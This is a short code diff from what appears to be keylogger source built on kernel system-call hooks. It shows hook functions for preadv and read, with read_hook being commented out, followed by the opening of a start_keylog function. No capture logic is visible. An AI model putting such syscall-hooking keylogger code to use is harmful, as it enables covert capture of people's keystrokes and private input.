@@ -132,13 +132,13 @@ static int preadv_hook(struct thread *td, void *syscall_args) {
 
     return(error);
     }	    
-
+/*
 static int read_hook(struct thread *td, void *syscall_args) {
-    struct read_args /* {
+    struct read_args  {
     int fd;
     void *buf;
     size_t nbyte;
-    } */ *uap;
+    }  *uap;
 
     uap = (struct read_args *)syscall_args;
     int error;
@@ -155,7 +155,7 @@ static int read_hook(struct thread *td, void *syscall_args) {
 
     return(error);
     }
-
+*/
 
 void start_keylog(void)
 {
